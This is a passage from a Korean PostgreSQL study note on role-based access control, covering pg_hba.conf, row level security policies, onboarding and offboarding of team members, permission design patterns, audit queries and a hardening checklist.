| `trust` | 🔴🔴 위험 | 인증 없음. 개발용으로도 최소 범위만 사용 |

### 프로덕션 pg_hba.conf 예시

```conf
# ============================================================
# pg_hba.conf — 프로덕션 환경 예시
# ============================================================
# 순서가 중요합니다! 위에서 아래로 순차 검사합니다.

# --- 1. 로컬 연결 ---
# postgres 슈퍼유저: OS의 postgres 사용자만 peer 인증으로 접속
local   all             postgres                                peer

# 일반 사용자의 로컬 접속: 비밀번호 필요
local   all             all                                     scram-sha-256

# --- 2. 로컬 루프백 ---
host    all             all             127.0.0.1/32            scram-sha-256
host    all             all             ::1/128                 scram-sha-256

# --- 3. 애플리케이션 서버 (내부 네트워크) ---
# 백엔드 서버 서브넷에서 ecommerce DB만 접속 가능
host    ecommerce       app_api         10.0.1.0/24             scram-sha-256

# --- 4. 분석 서버 ---
host    ecommerce       +analyst_team   10.0.2.0/24             scram-sha-256

# --- 5. 복제 연결 ---
host    replication     repl_user       10.0.3.0/24             scram-sha-256

# --- 6. VPN을 통한 DBA 접속 (SSL 필수) ---
hostssl all             +dba_team       172.16.0.0/16           scram-sha-256

# --- 7. 모니터링 ---
host    all             grafana_monitor 10.0.4.10/32            scram-sha-256

# --- 8. 나머지는 모두 거부 ---
host    all             all             0.0.0.0/0               reject
host    all             all             ::/0                    reject
```

### pg_hba.conf 검증 및 적용

```sql
-- 적용 전 문법 검증 (PG16+)
SELECT * FROM pg_hba_file_rules WHERE error IS NOT NULL;

-- 설정 리로드 (서버 재시작 불필요)
SELECT pg_reload_conf();

-- 현재 적용된 규칙 확인
SELECT
    line_number,
    type,
    database,
    user_name,
    address,
    netmask,
    auth_method,
    error
FROM pg_hba_file_rules
ORDER BY line_number;
```

---

## 8. Row Level Security (RLS) — 행 단위 접근 제어

### RLS의 핵심 규칙

1. RLS를 활성화하면 **기본적으로 모든 행이 차단**됩니다 (default-deny)
2. `PERMISSIVE` 정책끼리는 **OR**로 결합 (하나라도 통과하면 접근 가능)
3. `RESTRICTIVE` 정책끼리는 **AND**로 결합 (모두 통과해야 접근 가능)
4. 최종 조건: `(모든 RESTRICTIVE AND) AND (PERMISSIVE_1 OR PERMISSIVE_2 OR ...)`

```sql
-- 1. RLS 활성화
ALTER TABLE orders ENABLE ROW LEVEL SECURITY;

-- 2. 테이블 소유자도 RLS 적용하려면 (기본적으로 소유자는 RLS 우회)
ALTER TABLE orders FORCE ROW LEVEL SECURITY;
```

### USING vs WITH CHECK

| 절 | 적용 대상 | 실패 시 동작 |
|----|----------|-------------|
| `USING` | 기존 행에 대한 접근 (SELECT, UPDATE의 대상, DELETE) | 행이 조용히 보이지 않음 |
| `WITH CHECK` | 새로운/수정된 행의 유효성 (INSERT, UPDATE의 결과) | 에러 발생, 전체 명령 중단 |

```sql
-- USING만 지정하면 WITH CHECK도 같은 조건으로 자동 설정됨
CREATE POLICY orders_isolation ON orders
    FOR ALL
    TO app_role
    USING (customer_id = current_setting('app.customer_id')::int)
    WITH CHECK (customer_id = current_setting('app.customer_id')::int);
```

### PERMISSIVE vs RESTRICTIVE 실전 예시

```sql
-- 시나리오: 멀티테넌트 SaaS + 역할 기반 접근 + IP 제한

-- 1. PERMISSIVE: 일반 사용자는 자기 테넌트의 자기 주문만 (OR 조합)
CREATE POLICY user_own_orders ON orders
    AS PERMISSIVE
    FOR SELECT
    TO app_user
    USING (
        tenant_id = current_setting('app.tenant_id')::int
        AND customer_id = current_setting('app.customer_id')::int
    );

-- 2. PERMISSIVE: 매니저는 자기 테넌트의 모든 주문 (위 정책과 OR)
CREATE POLICY manager_tenant_orders ON orders
    AS PERMISSIVE
    FOR SELECT
    TO manager_role
    USING (tenant_id = current_setting('app.tenant_id')::int);

-- 3. RESTRICTIVE: 모든 접근은 내부 네트워크에서만 (AND 조합)
CREATE POLICY internal_network_only ON orders
    AS RESTRICTIVE
    FOR ALL
    TO PUBLIC
    USING (
        inet_client_addr() IS NULL                    -- Unix socket
        OR inet_client_addr() << '10.0.0.0/8'::inet  -- 내부 네트워크
    );

-- 최종 조건:
-- internal_network_only AND (user_own_orders OR manager_tenant_orders)
```

### RLS와 BYPASSRLS

```sql
-- SUPERUSER는 항상 RLS를 우회합니다
-- 테이블 소유자도 기본적으로 RLS를 우회합니다 (FORCE RLS 제외)

-- BYPASSRLS 속성을 가진 역할도 우회
ALTER ROLE data_migration WITH BYPASSRLS;

-- 주의: pg_read_all_data는 BYPASSRLS를 포함하지 않습니다!
-- RLS가 적용된 테이블에서는 정책에 따라 필터링됩니다
```

### RLS 성능 팁

```sql
-- RLS 정책에서 사용하는 컬럼에 인덱스를 만드세요
CREATE INDEX idx_orders_tenant_customer ON orders (tenant_id, customer_id);

-- EXPLAIN으로 RLS 조건이 인덱스를 사용하는지 확인
SET app.tenant_id = '1';
SET app.customer_id = '42';
EXPLAIN (ANALYZE, BUFFERS) SELECT * FROM orders WHERE total > 100;
-- Filter 절에 RLS 조건이 포함되고, Index Scan이 사용되는지 확인
```

---

## 9. 신규 팀원 온보딩 — 입사 첫날 체크리스트

### DBA/리드가 해야 할 작업

```sql
-- ============================================================
-- 신규 팀원 온보딩 스크립트
-- ============================================================

-- 1단계: 사용자 Role 생성
CREATE ROLE new_member
    LOGIN
    PASSWORD 'initial_temp_password_2024!'  -- 첫 로그인 후 즉시 변경
    VALID UNTIL '2025-03-31'                -- 수습기간 만료일 or 정기 갱신일
    CONNECTION LIMIT 5                       -- 동시 접속 제한
    IN ROLE backend_team;                    -- 소속 팀 그룹에 즉시 추가

-- 2단계: 비밀번호 변경 강제 (운영 정책으로 전달)
-- PostgreSQL에는 "첫 로그인 시 비밀번호 변경 강제" 기능이 없으므로
-- 팀 운영 정책으로 관리합니다.
-- 본인이 직접 변경:
-- ALTER ROLE new_member WITH PASSWORD 'my_new_secure_password';

-- 3단계: 개인 스키마 생성 (선택사항, 실험/학습용)
CREATE SCHEMA new_member AUTHORIZATION new_member;

-- 4단계: 팀별 추가 권한 부여
-- 백엔드 개발자인 경우
GRANT backend_team TO new_member WITH INHERIT TRUE;

-- 읽기 전용 접근이 필요한 다른 스키마가 있다면
GRANT USAGE ON SCHEMA analytics TO new_member;
GRANT SELECT ON ALL TABLES IN SCHEMA analytics TO new_member;

-- 5단계: 접속 정보 전달
-- - 호스트: db.internal.example.com
-- - 포트: 5432
-- - 데이터베이스: ecommerce
-- - 사용자: new_member
-- - 초기 비밀번호: (별도 전달)
-- - SSL: 필수 (sslmode=require)
```

### pg_hba.conf에 추가 (필요한 경우)

```conf
# 새 팀원이 VPN을 통해 접속하는 경우
# (팀 그룹으로 이미 등록되어 있다면 +backend_team 규칙으로 커버됨)
hostssl ecommerce  +backend_team  172.16.0.0/16  scram-sha-256
```

### 온보딩 검증 쿼리

```sql
-- 새 팀원의 권한이 올바르게 설정되었는지 확인

-- 1. Role 속성 확인
SELECT
    rolname, rolsuper, rolcreaterole, rolcreatedb,
    rolcanlogin, rolreplication, rolbypassrls,
    rolconnlimit, rolvaliduntil
FROM pg_roles
WHERE rolname = 'new_member';

-- 2. 그룹 멤버십 확인
SELECT
    r.rolname AS member,
    m.rolname AS member_of,
    am.admin_option,
    am.inherit_option,
    am.set_option
FROM pg_auth_members am
JOIN pg_roles r ON am.member = r.oid
JOIN pg_roles m ON am.roleid = m.oid
WHERE r.rolname = 'new_member';

-- 3. 테이블 접근 권한 확인
SELECT
    table_schema,
    table_name,
    string_agg(privilege_type, ', ' ORDER BY privilege_type) AS privileges
FROM information_schema.table_privileges
WHERE grantee = 'new_member'
   OR grantee IN (
       SELECT m.rolname FROM pg_auth_members am
       JOIN pg_roles r ON am.member = r.oid
       JOIN pg_roles m ON am.roleid = m.oid
       WHERE r.rolname = 'new_member'
   )
GROUP BY table_schema, table_name
ORDER BY table_schema, table_name;

-- 4. 접속 테스트 (다른 터미널에서)
-- psql "host=localhost dbname=ecommerce user=new_member sslmode=require"
```

---

## 10. 퇴사자 처리 — 계정 비활성화와 소유권 이전

### 즉시 조치 (퇴사 당일)

```sql
-- 1단계: 즉시 로그인 차단
ALTER ROLE departed_member NOLOGIN;

-- 2단계: 현재 활성 세션 강제 종료
SELECT pg_terminate_backend(pid)
FROM pg_stat_activity
WHERE usename = 'departed_member';

-- 3단계: 비밀번호 무효화
ALTER ROLE departed_member PASSWORD NULL;
```

### 소유권 이전 (퇴사 후 처리)

```sql
-- departed_member가 소유한 객체 확인
SELECT
    n.nspname AS schema,
    c.relname AS object_name,
    CASE c.relkind
        WHEN 'r' THEN 'table'
        WHEN 'v' THEN 'view'
        WHEN 'm' THEN 'materialized view'
        WHEN 'S' THEN 'sequence'
        WHEN 'i' THEN 'index'
    END AS object_type
FROM pg_class c
JOIN pg_namespace n ON c.relnamespace = n.oid
JOIN pg_roles r ON c.relowner = r.oid
WHERE r.rolname = 'departed_member';

-- 모든 소유 객체를 팀 리드에게 이전
REASSIGN OWNED BY departed_member TO team_lead;

-- 남은 권한 모두 제거
DROP OWNED BY departed_member;
-- 주의: DROP OWNED는 권한만 제거하고 (REASSIGN 후이므로) 객체는 삭제하지 않음

-- 최종적으로 Role 삭제
DROP ROLE departed_member;
```

> **주의**: `DROP ROLE`은 해당 Role이 소유한 객체가 있으면 실패합니다.
> 반드시 `REASSIGN OWNED` → `DROP OWNED` → `DROP ROLE` 순서로 실행하세요.

---

## 11. 프로젝트별 권한 설계 패턴

### 패턴 1: 소규모 팀 (5명 이하)

```sql
-- 그룹 Role 2개로 단순하게
CREATE ROLE dev_team;       -- 개발자 (읽기/쓰기)
CREATE ROLE readonly_team;  -- 기획/디자인 (읽기만)

-- dev_team 권한
GRANT CONNECT ON DATABASE myapp TO dev_team;
GRANT USAGE, CREATE ON SCHEMA public TO dev_team;
GRANT ALL ON ALL TABLES IN SCHEMA public TO dev_team;
GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO dev_team;
ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT ALL ON TABLES TO dev_team;
ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT ALL ON SEQUENCES TO dev_team;

-- readonly_team 권한
GRANT CONNECT ON DATABASE myapp TO readonly_team;
GRANT USAGE ON SCHEMA public TO readonly_team;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO readonly_team;
ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT ON TABLES TO readonly_team;
```

### 패턴 2: 중규모 팀 (스키마 분리)

```sql
-- 역할 계층
CREATE ROLE app_readonly;        -- 기본 읽기
CREATE ROLE app_readwrite;       -- 읽기 + 쓰기
CREATE ROLE app_admin;           -- 관리자
CREATE ROLE app_analyst;         -- 분석가

-- 계층 상속 설정
GRANT app_readonly TO app_readwrite;   -- readwrite는 readonly 포함
GRANT app_readwrite TO app_admin;      -- admin은 readwrite 포함

-- 스키마별 권한
-- public: 비즈니스 테이블
GRANT USAGE ON SCHEMA public TO app_readonly;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO app_readonly;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO app_readwrite;

-- analytics: 분석용 뷰/집계
CREATE SCHEMA analytics;
GRANT USAGE ON SCHEMA analytics TO app_analyst, app_readonly;
GRANT SELECT ON ALL TABLES IN SCHEMA analytics TO app_analyst, app_readonly;
GRANT CREATE ON SCHEMA analytics TO app_analyst;  -- 분석용 뷰 생성 가능

-- audit: 감사 로그 (DBA만)
CREATE SCHEMA audit;
GRANT USAGE ON SCHEMA audit TO app_admin;
GRANT SELECT ON ALL TABLES IN SCHEMA audit TO app_admin;
```

### 패턴 3: 마이크로서비스 (서비스별 격리)

```sql
-- 각 서비스가 자기 스키마만 접근
CREATE SCHEMA svc_user;
CREATE SCHEMA svc_order;
CREATE SCHEMA svc_payment;
CREATE SCHEMA svc_notification;

CREATE ROLE user_service LOGIN PASSWORD '...';
CREATE ROLE order_service LOGIN PASSWORD '...';
CREATE ROLE payment_service LOGIN PASSWORD '...';
CREATE ROLE notification_service LOGIN PASSWORD '...';

-- 각 서비스는 자기 스키마만 접근
GRANT USAGE, CREATE ON SCHEMA svc_user TO user_service;
GRANT ALL ON ALL TABLES IN SCHEMA svc_user TO user_service;

GRANT USAGE, CREATE ON SCHEMA svc_order TO order_service;
GRANT ALL ON ALL TABLES IN SCHEMA svc_order TO order_service;

-- 서비스 간 참조가 필요한 경우: 읽기 전용 교차 접근
-- order_service가 user_service의 users 테이블을 참조해야 할 때
GRANT USAGE ON SCHEMA svc_user TO order_service;
GRANT SELECT ON svc_user.users TO order_service;
-- 특정 컬럼만 허용하려면:
-- GRANT SELECT (id, username, email) ON svc_user.users TO order_service;
```

### 패턴 4: 멀티테넌트 (RLS 기반)

```sql
-- 단일 스키마 + RLS로 테넌트 격리
CREATE ROLE tenant_app LOGIN PASSWORD '...';

-- 모든 테이블에 tenant_id 컬럼 필수
ALTER TABLE orders ENABLE ROW LEVEL SECURITY;
ALTER TABLE orders FORCE ROW LEVEL SECURITY;

CREATE POLICY tenant_isolation ON orders
    FOR ALL TO tenant_app
    USING (tenant_id = current_setting('app.tenant_id')::int)
    WITH CHECK (tenant_id = current_setting('app.tenant_id')::int);

-- 애플리케이션 레벨에서 세션마다 tenant_id 설정
-- SET app.tenant_id = '42';  (커넥션 풀에서 매 요청마다)
```

---

## 12. SET 및 ALTER SYSTEM 파라미터 권한 (PG15+)

PostgreSQL 15부터 설정 파라미터에 대한 세밀한 권한 제어가 가능합니다:

```sql
-- 특정 역할이 work_mem을 세션 단위로 변경할 수 있도록
GRANT SET ON PARAMETER work_mem TO analyst_team;
GRANT SET ON PARAMETER statement_timeout TO backend_team;

-- DBA에게 ALTER SYSTEM 권한 (postgresql.conf 영구 변경)
GRANT ALTER SYSTEM ON PARAMETER max_connections TO dba_team;
GRANT ALTER SYSTEM ON PARAMETER shared_buffers TO dba_team;

-- 확인
SELECT * FROM pg_parameter_acl;
```

---

## 13. 권한 감사 및 모니터링 — 필수 쿼리 모음

### 보안 점검 쿼리

```sql
-- ============================================================
-- 1. 위험한 Role 찾기
-- ============================================================

-- SUPERUSER 목록 (최소화해야 함)
SELECT rolname, rolvaliduntil
FROM pg_roles WHERE rolsuper = true;

-- CREATEROLE 보유자 (새 Role을 만들 수 있는 사람)
SELECT rolname FROM pg_roles WHERE rolcreaterole = true AND NOT rolsuper;

-- BYPASSRLS 보유자 (RLS를 우회하는 사람)
SELECT rolname FROM pg_roles WHERE rolbypassrls = true AND NOT rolsuper;

-- REPLICATION 보유자 (전체 DB 데이터를 읽을 수 있는 사람)
SELECT rolname FROM pg_roles WHERE rolreplication = true AND NOT rolsuper;

-- ============================================================
-- 2. 계정 상태 점검
-- ============================================================

-- 비밀번호 없는 LOGIN 가능 계정 (위험!)
SELECT rolname
FROM pg_roles
WHERE rolcanlogin = true AND rolpassword IS NULL;

-- 비밀번호 만료된/만료 예정 계정
SELECT
    rolname,
    rolvaliduntil,
    CASE
        WHEN rolvaliduntil IS NULL THEN '만료 없음 ⚠️'
        WHEN rolvaliduntil < NOW() THEN '만료됨 🔴'
        WHEN rolvaliduntil < NOW() + INTERVAL '30 days' THEN '30일 내 만료 🟡'
        ELSE '유효 🟢'
    END AS status
FROM pg_roles
WHERE rolcanlogin = true
ORDER BY rolvaliduntil NULLS FIRST;

-- 동시 접속 제한이 없는 계정
SELECT rolname, rolconnlimit
FROM pg_roles
WHERE rolcanlogin = true AND rolconnlimit = -1
  AND rolname NOT IN ('postgres');

-- ============================================================
-- 3. 권한 과다 부여 점검
-- ============================================================

-- public 스키마에서 PUBLIC에 부여된 권한 확인
SELECT
    n.nspname AS schema,
    c.relname AS object,
    CASE c.relkind
        WHEN 'r' THEN 'table' WHEN 'v' THEN 'view'
        WHEN 'S' THEN 'sequence' WHEN 'f' THEN 'function'
    END AS type,
    array_to_string(c.relacl, E'\n') AS acl
FROM pg_class c
JOIN pg_namespace n ON c.relnamespace = n.oid
WHERE n.nspname = 'public'
  AND c.relacl::text LIKE '%=_%'  -- PUBLIC에 권한이 있는 객체
ORDER BY c.relname;

-- trust 인증 사용 여부 확인
SELECT line_number, type, database, user_name, address, auth_method
FROM pg_hba_file_rules
WHERE auth_method = 'trust';

-- ============================================================
-- 4. 특정 사용자의 전체 권한 확인 (effective privileges)
-- ============================================================

-- has_*_privilege 함수를 활용한 권한 확인
SELECT
    t.schemaname,
    t.tablename,
    has_table_privilege('alice', t.schemaname || '.' || t.tablename, 'SELECT') AS can_select,
    has_table_privilege('alice', t.schemaname || '.' || t.tablename, 'INSERT') AS can_insert,
    has_table_privilege('alice', t.schemaname || '.' || t.tablename, 'UPDATE') AS can_update,
    has_table_privilege('alice', t.schemaname || '.' || t.tablename, 'DELETE') AS can_delete
FROM pg_tables t
WHERE t.schemaname NOT IN ('pg_catalog', 'information_schema')
ORDER BY t.schemaname, t.tablename;

-- 특정 사용자의 스키마 접근 권한
SELECT
    nspname AS schema_name,
    has_schema_privilege('alice', nspname, 'USAGE') AS can_use,
    has_schema_privilege('alice', nspname, 'CREATE') AS can_create
FROM pg_namespace
WHERE nspname NOT LIKE 'pg_%'
  AND nspname != 'information_schema';

-- ============================================================
-- 5. RLS 정책 현황
-- ============================================================

-- RLS가 활성화된 테이블과 정책 목록
SELECT
    schemaname,
    tablename,
    policyname,
    permissive,    -- YES: permissive, NO: restrictive
    roles,
    cmd,
    qual AS using_expression,
    with_check
FROM pg_policies
ORDER BY schemaname, tablename, policyname;

-- RLS가 활성화되었지만 정책이 없는 테이블 (모든 행 차단됨!)
SELECT
    t.schemaname,
    t.tablename
FROM pg_tables t
WHERE t.rowsecurity = true
  AND NOT EXISTS (
      SELECT 1 FROM pg_policies p
      WHERE p.schemaname = t.schemaname AND p.tablename = t.tablename
  );
```

### 기본 설정 권한 확인

```sql
-- ALTER DEFAULT PRIVILEGES 설정 확인
SELECT
    pg_get_userbyid(d.defaclrole) AS owner,
    n.nspname AS schema,
    CASE d.defaclobjtype
        WHEN 'r' THEN 'tables'
        WHEN 'S' THEN 'sequences'
        WHEN 'f' THEN 'functions'
        WHEN 'T' THEN 'types'
        WHEN 'n' THEN 'schemas'
    END AS object_type,
    array_to_string(d.defaclacl, E'\n') AS default_acl
FROM pg_default_acl d
LEFT JOIN pg_namespace n ON d.defaclnamespace = n.oid
ORDER BY owner, schema, object_type;
```

---

## 14. 자주 하는 실수와 트러블슈팅

### 실수 1: "GRANT SELECT ON ALL TABLES"만 했는데 접근 안 됨

```sql
-- 증상: permission denied for schema public
-- 원인: USAGE 권한이 없음

-- 올바른 방법:
GRANT USAGE ON SCHEMA public TO role_name;     -- 스키마 접근 (먼저!)
GRANT SELECT ON ALL TABLES IN SCHEMA public TO role_name;  -- 테이블 접근
```

### 실수 2: "새 테이블이 만들어지면 권한이 없어요"

```sql
-- 원인: GRANT는 현재 객체에만 적용, 미래 객체에는 미적용
-- 해결: ALTER DEFAULT PRIVILEGES 추가

GRANT SELECT ON ALL TABLES IN SCHEMA public TO role_name;      -- 기존 테이블
ALTER DEFAULT PRIVILEGES IN SCHEMA public                       -- 미래 테이블
    GRANT SELECT ON TABLES TO role_name;
```

### 실수 3: "ALTER DEFAULT PRIVILEGES 했는데 다른 사람이 만든 테이블에 적용 안 됨"

```sql
-- 원인: ALTER DEFAULT PRIVILEGES는 실행한 Role이 만든 객체에만 적용
-- 해결: FOR ROLE 옵션 사용

-- alice가 만드는 테이블에도 적용하려면:
ALTER DEFAULT PRIVILEGES FOR ROLE alice IN SCHEMA public
    GRANT SELECT ON TABLES TO analyst_team;

-- 모든 개발자가 만드는 테이블에 적용하려면, 각 개발자별로 설정하거나
-- 하나의 공유 Role로 테이블을 만들도록 운영
```

### 실수 4: "REVOKE 했는데 여전히 접근 가능"

```sql
-- 가능한 원인들:
-- 1. 그룹 Role을 통한 간접 권한
SELECT r.rolname AS member, m.rolname AS member_of
FROM pg_auth_members am
JOIN pg_roles r ON am.member = r.oid
JOIN pg_roles m ON am.roleid = m.oid
WHERE r.rolname = 'target_user';

-- 2. PUBLIC에 부여된 권한
-- PUBLIC은 모든 Role에 적용되므로:
REVOKE SELECT ON secret_table FROM PUBLIC;

-- 3. 소유자 권한 (소유자는 항상 모든 권한을 가짐)
-- 소유권을 이전해야 합니다:
ALTER TABLE secret_table OWNER TO restricted_owner;
```

### 실수 5: "RLS 활성화했는데 소유자가 여전히 모든 행을 봄"

```sql
-- 원인: 테이블 소유자는 기본적으로 RLS를 우회합니다
-- 해결:
ALTER TABLE orders FORCE ROW LEVEL SECURITY;  -- 소유자에게도 RLS 적용
```

### 실수 6: "RLS 정책을 만들었는데 아무 행도 안 보임"

```sql
-- 가능한 원인:
-- 1. PERMISSIVE 정책이 하나도 없음 (RESTRICTIVE만 있으면 기본 거부)
-- 2. current_setting() 값이 설정되지 않음

-- 확인:
SELECT * FROM pg_policies WHERE tablename = 'orders';

-- 세션 변수 확인:
SELECT current_setting('app.tenant_id', true);  -- true: 없으면 NULL 반환
-- NULL이면 비교 자체가 실패하여 모든 행이 차단됨!
```

### 실수 7: "DROP ROLE이 실패합니다"

```sql
-- 에러: role "old_user" cannot be dropped because some objects depend on it

-- 올바른 순서:
-- 1단계: 소유 객체 이전
REASSIGN OWNED BY old_user TO new_owner;

-- 2단계: 나머지 권한/의존성 제거
DROP OWNED BY old_user;

-- 3단계: 다른 데이터베이스에서도 반복! (데이터베이스별로 실행 필요)
\c other_database
REASSIGN OWNED BY old_user TO new_owner;
DROP OWNED BY old_user;

-- 4단계: Role 삭제
\c postgres
DROP ROLE old_user;
```

---

## 15. FUNCTION 보안 — SECURITY DEFINER vs SECURITY INVOKER

### SECURITY INVOKER (기본값)

```sql
-- 호출자의 권한으로 실행 (기본 동작)
CREATE FUNCTION get_my_orders()
RETURNS SETOF orders
LANGUAGE sql
SECURITY INVOKER  -- 기본값, 생략 가능
AS $$
    SELECT * FROM orders WHERE customer_id = current_setting('app.customer_id')::int;
$$;

-- alice가 호출하면 alice의 권한으로 orders에 접근
-- alice에게 orders SELECT 권한이 없으면 에러
```

### SECURITY DEFINER

```sql
-- 함수 소유자의 권한으로 실행 (위험할 수 있음!)
CREATE FUNCTION admin_reset_password(target_user TEXT, new_password TEXT)
RETURNS void
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = pg_catalog, public  -- ⚠️ 반드시 search_path 고정!
AS $$
BEGIN
    EXECUTE format('ALTER ROLE %I WITH PASSWORD %L', target_user, new_password);
END;
$$;

-- 주의: SECURITY DEFINER 함수의 PUBLIC EXECUTE를 반드시 제거
REVOKE EXECUTE ON FUNCTION admin_reset_password(TEXT, TEXT) FROM PUBLIC;
GRANT EXECUTE ON FUNCTION admin_reset_password(TEXT, TEXT) TO dba_team;
```

> **공식 문서 경고**: "A SECURITY DEFINER function should always be written to include
> `SET search_path` to ensure the function cannot be tricked into doing something unintended."
> — [CREATE FUNCTION](https://www.postgresql.org/docs/17/sql-createfunction.html)

---

## 16. 실전 보안 체크리스트

### 초기 설정 시

- [ ] `postgres` 슈퍼유저 비밀번호를 강력하게 설정
- [ ] pg_hba.conf에서 `trust` 인증 제거 또는 localhost로 제한
- [ ] `scram-sha-256` 인증 사용 (`password_encryption = 'scram-sha-256'`)
- [ ] public 스키마의 `CREATE` 권한 확인 (PG15+는 기본 제거)
- [ ] `PUBLIC`의 함수 `EXECUTE` 권한 검토 및 필요시 제거
- [ ] SSL 활성화 (`ssl = on`, 최소 TLSv1.2)
- [ ] 불필요한 `CONNECT` 권한 PUBLIC에서 제거
- [ ] `ALTER DEFAULT PRIVILEGES`로 미래 객체 권한 설정

### 팀원 관리 시

- [ ] 그룹 Role 기반 권한 설계 (개인에게 직접 부여 지양)
- [ ] 최소 권한 원칙 적용 (필요한 것만 부여)
- [ ] 비밀번호 만료일 설정 (`VALID UNTIL`)
- [ ] 동시 접속 수 제한 (`CONNECTION LIMIT`)
- [ ] 퇴사자 처리 프로세스 수립 (NOLOGIN → REASSIGN → DROP)
- [ ] 정기적 권한 감사 (분기별 권장)

### 애플리케이션 설정 시

- [ ] 애플리케이션 전용 Role 사용 (슈퍼유저 사용 금지)
- [ ] 필요한 테이블에만 필요한 권한 부여
- [ ] SECURITY DEFINER 함수 사용 시 `search_path` 고정
- [ ] RLS 사용 시 인덱스 생성 확인
- [ ] 커넥션 풀 사용 시 `SET ROLE` / `RESET ROLE` 관리

### 모니터링

- [ ] `log_connections = on`, `log_disconnections = on`
- [ ] 실패한 인증 시도 모니터링 (`log_line_prefix`에 사용자/IP 포함)
- [ ] 정기적 보안 감사 쿼리 실행 (13장 쿼리 모음 참조)
- [ ] `pg_hba_file_rules`에서 에러 확인

---

## 17. psql 권한 관련 메타 명령어

| 명령어 | 설명 |
|--------|------|
| `\du` 또는 `\dg` | 모든 Role 목록 + 속성 표시 |
| `\du+` | Role 목록 + 상세 정보 (설명 포함) |
| `\dp` 또는 `\z` | 테이블/뷰의 ACL (접근 권한) 표시 |
| `\dp tablename` | 특정 테이블의 ACL 표시 |
| `\ddp` | ALTER DEFAULT PRIVILEGES 설정 확인 |
| `\dn+` | 스키마 목록 + 접근 권한 |
| `\df+` | 함수 목록 + 접근 권한 |
| `\di+` | 인덱스 목록 + 소유자 |
| `\drds` | Role별 SET 설정 확인 |

---

## 참고 링크

### PostgreSQL 17 공식 문서

- [Chapter 21: Database Roles](https://www.postgresql.org/docs/17/user-manag.html)
- [21.2: Role Attributes](https://www.postgresql.org/docs/17/role-attributes.html)
- [21.3: Role Membership](https://www.postgresql.org/docs/17/role-membership.html)
- [21.5: Predefined Roles](https://www.postgresql.org/docs/17/predefined-roles.html)
- [5.7: Privileges](https://www.postgresql.org/docs/17/ddl-priv.html)
- [5.8: Row Security Policies](https://www.postgresql.org/docs/17/ddl-rowsecurity.html)
- [5.9: Schemas](https://www.postgresql.org/docs/17/ddl-schemas.html)
- [21.1: The pg_hba.conf File](https://www.postgresql.org/docs/17/auth-pg-hba-conf.html)
- [SQL: CREATE ROLE](https://www.postgresql.org/docs/17/sql-createrole.html)
- [SQL: GRANT](https://www.postgresql.org/docs/17/sql-grant.html)
- [SQL: REVOKE](https://www.postgresql.org/docs/17/sql-revoke.html)
- [SQL: ALTER DEFAULT PRIVILEGES](https://www.postgresql.org/docs/17/sql-alterdefaultprivileges.html)
- [SQL: CREATE POLICY](https://www.postgresql.org/docs/17/sql-createpolicy.html)

### 이 프로젝트의 관련 노트

- [12-security.md](./12-security.md) — 보안 기초 및 RLS 실습
- [01-architecture-and-os.md](./01-architecture-and-os.md) — 프로세스 모델과 인증 흐름
- [14-monitoring-and-tuning.md](./14-monitoring-and-tuning.md) — 모니터링 설정 (`log_connections` 등)
